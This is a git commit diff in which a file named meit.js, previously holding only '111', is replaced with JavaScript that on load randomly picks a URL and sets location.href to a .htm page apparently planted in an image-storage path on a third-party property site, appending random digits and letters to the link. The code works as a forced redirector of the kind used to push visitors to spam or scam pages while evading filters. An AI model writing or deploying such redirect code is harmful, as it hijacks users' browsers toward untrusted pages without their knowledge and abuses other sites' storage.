e3a0593d7169ad9da250bfa21e16fcec6961b42a
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-05-06 01:58:54 +0800

    Update meit.js

--- meit.js
+++ meit.js
@@ -1,1 +1,17 @@
-111
+var urls=[
+' http://images1.fangxiaoer.com./oss_images/salehouse/2024/05/06/20240506015622139.htm#{nnnnnnn}{wwww}',
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
